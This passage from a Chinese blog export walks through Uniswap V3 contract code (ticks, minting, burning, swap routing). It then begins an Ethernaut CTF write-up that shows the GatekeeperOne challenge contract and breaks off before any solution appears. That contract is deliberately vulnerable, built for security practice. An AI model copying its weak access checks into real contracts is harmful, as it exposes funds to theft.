feeGrowthBelow0X128 &#x3D; lower.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthBelow1X128 &#x3D; lower.feeGrowthOutside1X128;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        feeGrowthBelow0X128 &#x3D; feeGrowthGlobal0X128 - lower.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthBelow1X128 &#x3D; feeGrowthGlobal1X128 - lower.feeGrowthOutside1X128;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; calculate fee growth above</span><br><span class="line">    uint256 feeGrowthAbove0X128;</span><br><span class="line">    uint256 feeGrowthAbove1X128;</span><br><span class="line">    if (tickCurrent &lt; tickUpper) &#123;</span><br><span class="line">        feeGrowthAbove0X128 &#x3D; upper.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthAbove1X128 &#x3D; upper.feeGrowthOutside1X128;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        feeGrowthAbove0X128 &#x3D; feeGrowthGlobal0X128 - upper.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthAbove1X128 &#x3D; feeGrowthGlobal1X128 - upper.feeGrowthOutside1X128;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    feeGrowthInside0X128 &#x3D; feeGrowthGlobal0X128 - feeGrowthBelow0X128 - feeGrowthAbove0X128;</span><br><span class="line">    feeGrowthInside1X128 &#x3D; feeGrowthGlobal1X128 - feeGrowthBelow1X128 - feeGrowthAbove1X128;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>update</code>函数用于更新trick，每当trick从初始化转为未初始化时需要更新trick并返回真，反之亦然.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function update(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tick,</span><br><span class="line">    int24 tickCurrent,</span><br><span class="line">    int128 liquidityDelta,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128,</span><br><span class="line">    uint160 secondsPerLiquidityCumulativeX128,</span><br><span class="line">    int56 tickCumulative,</span><br><span class="line">    uint32 time,</span><br><span class="line">    bool upper,</span><br><span class="line">    uint128 maxLiquidity</span><br><span class="line">) internal returns (bool flipped) &#123;</span><br><span class="line">    Tick.Info storage info &#x3D; self[tick];</span><br><span class="line"> </span><br><span class="line">    uint128 liquidityGrossBefore &#x3D; info.liquidityGross;</span><br><span class="line">    uint128 liquidityGrossAfter &#x3D; LiquidityMath.addDelta(liquidityGrossBefore, liquidityDelta);</span><br><span class="line"> </span><br><span class="line">    require(liquidityGrossAfter &lt;&#x3D; maxLiquidity, &#39;LO&#39;);</span><br><span class="line"> </span><br><span class="line">    flipped &#x3D; (liquidityGrossAfter &#x3D;&#x3D; 0) !&#x3D; (liquidityGrossBefore &#x3D;&#x3D; 0);</span><br><span class="line"> </span><br><span class="line">    if (liquidityGrossBefore &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        &#x2F;&#x2F; by convention, we assume that all growth before a tick was initialized happened _below_ the tick</span><br><span class="line">        if (tick &lt;&#x3D; tickCurrent) &#123;</span><br><span class="line">            info.feeGrowthOutside0X128 &#x3D; feeGrowthGlobal0X128;</span><br><span class="line">            info.feeGrowthOutside1X128 &#x3D; feeGrowthGlobal1X128;</span><br><span class="line">            info.secondsPerLiquidityOutsideX128 &#x3D; secondsPerLiquidityCumulativeX128;</span><br><span class="line">            info.tickCumulativeOutside &#x3D; tickCumulative;</span><br><span class="line">            info.secondsOutside &#x3D; time;</span><br><span class="line">        &#125;</span><br><span class="line">        info.initialized &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    info.liquidityGross &#x3D; liquidityGrossAfter;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; when the lower (upper) tick is crossed left to right (right to left), liquidity must be added (removed)</span><br><span class="line">    info.liquidityNet &#x3D; upper</span><br><span class="line">        ? int256(info.liquidityNet).sub(liquidityDelta).toInt128()</span><br><span class="line">        : int256(info.liquidityNet).add(liquidityDelta).toInt128();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>clear</code>函数用于清除trick数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function clear(mapping(int24 &#x3D;&gt; Tick.Info) storage self, int24 tick) internal &#123;</span><br><span class="line">    delete self[tick];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>cross</code>函数用于根据价格变动的需要转换到下一个trick<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function cross(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tick,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128,</span><br><span class="line">    uint160 secondsPerLiquidityCumulativeX128,</span><br><span class="line">    int56 tickCumulative,</span><br><span class="line">    uint32 time</span><br><span class="line">) internal returns (int128 liquidityNet) &#123;</span><br><span class="line">    Tick.Info storage info &#x3D; self[tick];</span><br><span class="line">    info.feeGrowthOutside0X128 &#x3D; feeGrowthGlobal0X128 - info.feeGrowthOutside0X128;</span><br><span class="line">    info.feeGrowthOutside1X128 &#x3D; feeGrowthGlobal1X128 - info.feeGrowthOutside1X128;</span><br><span class="line">    info.secondsPerLiquidityOutsideX128 &#x3D; secondsPerLiquidityCumulativeX128 - info.secondsPerLiquidityOutsideX128;</span><br><span class="line">    info.tickCumulativeOutside &#x3D; tickCumulative - info.tickCumulativeOutside;</span><br><span class="line">    info.secondsOutside &#x3D; time - info.secondsOutside;</span><br><span class="line">    liquidityNet &#x3D; info.liquidityNet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="tick-位图"><a href="#tick-位图" class="headerlink" title="tick 位图"></a>tick 位图</h4><p>tick 位图用于记录所有被引用的 lower/upper tick index，我们可以用过 tick 位图，从当前价格找到下一个（从左至右或者从右至左）被引用的 tick index。关于 tick 位图的管理，在 _updatePosition 中的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (flippedLower) &#123;</span><br><span class="line">    tickBitmap.flipTick(tickLower, tickSpacing);</span><br><span class="line">    secondsOutside.initialize(tickLower, tick, tickSpacing, blockTimestamp);</span><br><span class="line">&#125;</span><br><span class="line">if (flippedUpper) &#123;</span><br><span class="line">    tickBitmap.flipTick(tickUpper, tickSpacing);</span><br><span class="line">    secondsOutside.initialize(tickUpper, tick, tickSpacing, blockTimestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里不做进一步的说明，具体代码实现在<code>TickBitmap</code>库中。tick 位图有以下几个特性：</p><ul><li>对于不存在的 tick，不需要初始值，因为访问 map 中不存在的 key 默认值就是 0</li><li>通过对位图的每个 word(uint256) 建立索引来管理位图，即访问路径为 word index -&gt; word -&gt; tick bit</li></ul><h4 id="完成流动性添加"><a href="#完成流动性添加" class="headerlink" title="完成流动性添加"></a>完成流动性添加</h4><p><code>_modifyPosition</code>调用完成后，会返回 x token, 和 y token 的数量。再来看 UniswapV3Pool.mint 的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">function mint(</span><br><span class="line">    address recipient,</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    uint128 amount,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external override lock returns (uint256 amount0, uint256 amount1) &#123;</span><br><span class="line">    require(amount &gt; 0);</span><br><span class="line">    (, int256 amount0Int, int256 amount1Int) &#x3D;</span><br><span class="line">        _modifyPosition(</span><br><span class="line">            ModifyPositionParams(&#123;</span><br><span class="line">                owner: recipient,</span><br><span class="line">                tickLower: tickLower,</span><br><span class="line">                tickUpper: tickUpper,</span><br><span class="line">                liquidityDelta: int256(amount).toInt128()</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    amount0 &#x3D; uint256(amount0Int);</span><br><span class="line">    amount1 &#x3D; uint256(amount1Int);</span><br><span class="line"></span><br><span class="line">    uint256 balance0Before;</span><br><span class="line">    uint256 balance1Before;</span><br><span class="line">    &#x2F;&#x2F; 获取当前池中的 x token, y token 余额</span><br><span class="line">    if (amount0 &gt; 0) balance0Before &#x3D; balance0();</span><br><span class="line">    if (amount1 &gt; 0) balance1Before &#x3D; balance1();</span><br><span class="line">    &#x2F;&#x2F; 将需要的 x token 和 y token 数量传给回调函数，这里预期回调函数会将指定数量的 token 发送到合约中</span><br><span class="line">    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);</span><br><span class="line">    &#x2F;&#x2F; 回调完成后，检查发送至合约的 token 是否复合预期，如果不满足检查则回滚交易</span><br><span class="line">    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;&#x3D; balance0(), &#39;M0&#39;);</span><br><span class="line">    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;&#x3D; balance1(), &#39;M1&#39;);</span><br><span class="line"></span><br><span class="line">    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个函数关键的步骤就是通过回调函数，让调用方发送指定数量的 x token 和 y token 至合约中。</p><p>再来看<code>NonfungiblePositionManager.mint</code>的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">function mint(MintParams calldata params)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    override</span><br><span class="line">    checkDeadline(params.deadline)</span><br><span class="line">    returns (</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        uint256 amount0,</span><br><span class="line">        uint256 amount1</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    IUniswapV3Pool pool;</span><br><span class="line">    &#x2F;&#x2F; 这里是添加流动性，并完成 x token 和 y token 的发送</span><br><span class="line">    (amount0, amount1, pool) &#x3D; addLiquidity(</span><br><span class="line">        AddLiquidityParams(&#123;</span><br><span class="line">            token0: params.token0,</span><br><span class="line">            token1: params.token1,</span><br><span class="line">            fee: params.fee,</span><br><span class="line">            recipient: address(this),</span><br><span class="line">            tickLower: params.tickLower,</span><br><span class="line">            tickUpper: params.tickUpper,</span><br><span class="line">            amount: params.amount,</span><br><span class="line">            amount0Max: params.amount0Max,</span><br><span class="line">            amount1Max: params.amount1Max</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 铸造 ERC721 token 给用户，用来代表用户所持有的流动性</span><br><span class="line">    _mint(params.recipient, (tokenId &#x3D; _nextId++));</span><br><span class="line"></span><br><span class="line">    bytes32 positionKey &#x3D; PositionKey.compute(address(this), params.tickLower, params.tickUpper);</span><br><span class="line">    (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) &#x3D; pool.positions(positionKey);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; idempotent set</span><br><span class="line">    uint80 poolId &#x3D;</span><br><span class="line">        cachePoolKey(</span><br><span class="line">            address(pool),</span><br><span class="line">            PoolAddress.PoolKey(&#123;token0: params.token0, token1: params.token1, fee: params.fee&#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 用 ERC721 的 token ID 作为键，将用户提供流动性的元信息保存起来</span><br><span class="line">    _positions[tokenId] &#x3D; Position(&#123;</span><br><span class="line">        nonce: 0,</span><br><span class="line">        operator: address(0),</span><br><span class="line">        poolId: poolId,</span><br><span class="line">        tickLower: params.tickLower,</span><br><span class="line">        tickUpper: params.tickUpper,</span><br><span class="line">        liquidity: params.amount,</span><br><span class="line">        feeGrowthInside0LastX128: feeGrowthInside0LastX128,</span><br><span class="line">        feeGrowthInside1LastX128: feeGrowthInside1LastX128,</span><br><span class="line">        tokensOwed0: 0,</span><br><span class="line">        tokensOwed1: 0</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到这个函数主要是将用户的 Position 保存起来，并给用户铸造 NFT token，代表其所持有的流动性。至此提供流动性的步骤就完成了。</p><h4 id="流动性的移除"><a href="#流动性的移除" class="headerlink" title="流动性的移除"></a>流动性的移除</h4><p>流动性的移除其实就是上述操作的逆操作，在<code>burn</code>函数中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function burn(</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    uint128 amount</span><br><span class="line">) external override lock returns (uint256 amount0, uint256 amount1) &#123;</span><br><span class="line">    &#x2F;&#x2F; 先计算出需要移除的 token 数</span><br><span class="line">    (Position.Info storage position, int256 amount0Int, int256 amount1Int) &#x3D;</span><br><span class="line">        _modifyPosition(</span><br><span class="line">            ModifyPositionParams(&#123;</span><br><span class="line">                owner: msg.sender,</span><br><span class="line">                tickLower: tickLower,</span><br><span class="line">                tickUpper: tickUpper,</span><br><span class="line">                liquidityDelta: -int256(amount).toInt128()</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    amount0 &#x3D; uint256(-amount0Int);</span><br><span class="line">    amount1 &#x3D; uint256(-amount1Int);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 注意这里，移除流动性后，将移出的 token 数记录到了 position.tokensOwed 上</span><br><span class="line">    if (amount0 &gt; 0 || amount1 &gt; 0) &#123;</span><br><span class="line">        (position.tokensOwed0, position.tokensOwed1) &#x3D; (</span><br><span class="line">            position.tokensOwed0 + uint128(amount0),</span><br><span class="line">            position.tokensOwed1 + uint128(amount1)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="交易过程"><a href="#交易过程" class="headerlink" title="交易过程"></a>交易过程</h3><p>v3 的<code>UniswapV3Pool</code>提供了比较底层的交易接口，而在<code>SwapRouter</code>合约中封装了面向用户的交易接口：</p><ul><li><strong>exactInput:</strong> 指定交易对路径，付出的 x token 数和预期得到的最小 y token 数（x, y 可以互换）</li><li><strong>exactOutput:</strong> 指定交易路径，付出的 x token 最大数和预期得到的 y token 数（x, y 可以互换）</li></ul><h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p>关于上文提到的交易路径，在进行两个代币交易时，是首先需要在链下计算出交易的路径，例如使用<code>ETH -&gt; DAI</code>：</p><ul><li>可以直接通过<code>ETH/DAI</code>的交易池完成</li><li>也可以通过<code>ETH -&gt; USDC -&gt; DAI</code>路径，即经过<code>ETH/USDC</code>, <code>USDC/DAI</code>两个交易池完成交易</li></ul><p>Uniswap 的前端会帮用户实时计算出最优路径（即交易的收益最高），作为参数传给合约调用。前端中这部分计算的具体实现在这里，具体过程为先用需要交易的输入代币，输出代币，以及一系列可用的中间代币（代码中叫 Base token）生成所有的路径（当然为了降低复杂度，路径中最多包含3个代币），然后遍历每个路径输出的输出代币数量，最后选取最佳路径.<br>事实上因为 v3 引入了费率的原因，在路径选择的过程中还需要考虑费率的因素。</p><h3 id="交易入口"><a href="#交易入口" class="headerlink" title="交易入口"></a>交易入口</h3><p>交易入口是<code>exactInput</code>函数，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">struct ExactInputParams &#123;</span><br><span class="line">    bytes path;                 &#x2F;&#x2F; 路径</span><br><span class="line">    address recipient;          &#x2F;&#x2F; 收款地址</span><br><span class="line">    uint256 deadline;           &#x2F;&#x2F; 交易有效期</span><br><span class="line">    uint256 amountIn;           &#x2F;&#x2F; 输入的 token 数（输入的 token 地址就是 path 中的第一个地址）</span><br><span class="line">    uint256 amountOutMinimum;   &#x2F;&#x2F; 预期交易最少获得的 token 数（获得的 token 地址就是 path 中最后一个地址）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function exactInput(ExactInputParams memory params)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    override</span><br><span class="line">    checkDeadline(params.deadline)</span><br><span class="line">    returns (uint256 amountOut)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 通过循环，遍历传入的路径，进行交易</span><br><span class="line">    while (true) &#123;</span><br><span class="line">        bool hasPools &#x3D; params.path.hasPools();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 完成当前路径的交易</span><br><span class="line">        params.amountIn &#x3D; exactInputSingle(</span><br><span class="line">            params.amountIn,</span><br><span class="line">            &#x2F;&#x2F; 如果是中间交易，又合约代为收取和支付中间代币</span><br><span class="line">            hasPools ? address(this) : params.recipient,</span><br><span class="line">            &#x2F;&#x2F; 给回调函数用的参数</span><br><span class="line">            SwapData(&#123;</span><br><span class="line">                path: params.path.getFirstPool(),</span><br><span class="line">                payer: msg.sender</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果路径全部遍历完成，则退出循环，交易完成</span><br><span class="line">        if (hasPools) &#123;</span><br><span class="line">            &#x2F;&#x2F; 步进 path 中的值</span><br><span class="line">            params.path &#x3D; params.path.skipToken();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            amountOut &#x3D; params.amountIn;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 检查交易是否满足预期</span><br><span class="line">    require(amountOut &gt;&#x3D; params.amountOutMinimum, &#39;Too little received&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="路径的编码"><a href="#路径的编码" class="headerlink" title="路径的编码"></a>路径的编码</h4><p>细心看的话其实可以知道上面输入的参数中 <code>path</code> 字段是 <code>bytes</code> 类型，通过这样可以实现更加紧凑的编码。Uniswap会将<code>bytes</code>作为一个数组使用，bytes类型就是一连串的<code>byte1</code>,因此相比普通数组其结构更加紧凑。在 Uniswap V3 中 <code>path</code>内部编码结构如下图：</p><p>![]path_encode.jpg)</p><p>图中展示了一个包含 2个路径（pool0, 和 pool1）的 path 编码。Uniswap 将编码解码操作封装在了 <code>Path</code> 库中，本文不再赘述其过程。每次交易时，会取出头部的 <code>tokenIn</code>, <code>tokenOut</code>, <code>fee</code>，使用这三个参数找到对应的交易池，完成交易。</p><h4 id="单个池的交易过程"><a href="#单个池的交易过程" class="headerlink" title="单个池的交易过程"></a>单个池的交易过程</h4><p>单个池的交易在 <code>exactInputSingle</code> 函数中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function exactInputSingle(</span><br><span class="line">    uint256 amountIn,</span><br><span class="line">    address recipient,</span><br><span class="line">    SwapData memory data</span><br><span class="line">) private returns (uint256 amountOut) &#123;</span><br><span class="line">    &#x2F;&#x2F; 将 path 解码，获取头部的 tokenIn, tokenOut, fee</span><br><span class="line">    (address tokenIn, address tokenOut, uint24 fee) &#x3D; data.path.decodeFirstPool();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 因为交易池只保存了 token x 的价格，这里我们需要知道输入的 token 是交易池 x token 还是 y token</span><br><span class="line">    bool zeroForOne &#x3D; tokenIn &lt; tokenOut;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 完成交易</span><br><span class="line">    (int256 amount0, int256 amount1) &#x3D;</span><br><span class="line">        getPool(tokenIn, tokenOut, fee).swap(</span><br><span class="line">            recipient,</span><br><span class="line">            zeroForOne,</span><br><span class="line">            amountIn.toInt256(),</span><br><span class="line">            zeroForOne ? MIN_SQRT_RATIO : MAX_SQRT_RATIO,</span><br><span class="line">            &#x2F;&#x2F; 给回调函数用的参数</span><br><span class="line">            abi.encode(data)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    return uint256(-(zeroForOne ? amount1 : amount0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交易过程是先获取交易池，然后确定本次交易的输出是交易池的<code>token x</code>还是<code>token y</code></p><p>这是因为交易池中只保存了x的价格，所以<code>token x</code>和<code>token y</code>的计算公式是不一样的。最用再调用<code>UniswapV3Pool</code>的<code>swap</code>完成交易。</p><h4 id="交易分解"><a href="#交易分解" class="headerlink" title="交易分解"></a>交易分解</h4><p><code>UniswapV3Pool.swap</code> 函数比较长，这里简要描述其交易步骤：</p><p>假设支付的token为x，价格为：</p><script type="math/tex; mode=display">\sqrt(P) = \sqrt(\frac{y}{x} )</script><p><img src="swap.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Uniswap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Uniswap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 13-19</title>
      <link href="/2022-11-03-ethernaut03/"/>
      <url>/2022-11-03-ethernaut03/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-13-19"><a href="#Ethernaut靶场刷题记录-13-19" class="headerlink" title="Ethernaut靶场刷题记录(13-19)"></a>Ethernaut靶场刷题记录(13-19)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 Gatekeeper One"></a>13 Gatekeeper One</h2><p>这关主要是考查对solidity合约基础知识的了解。<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span 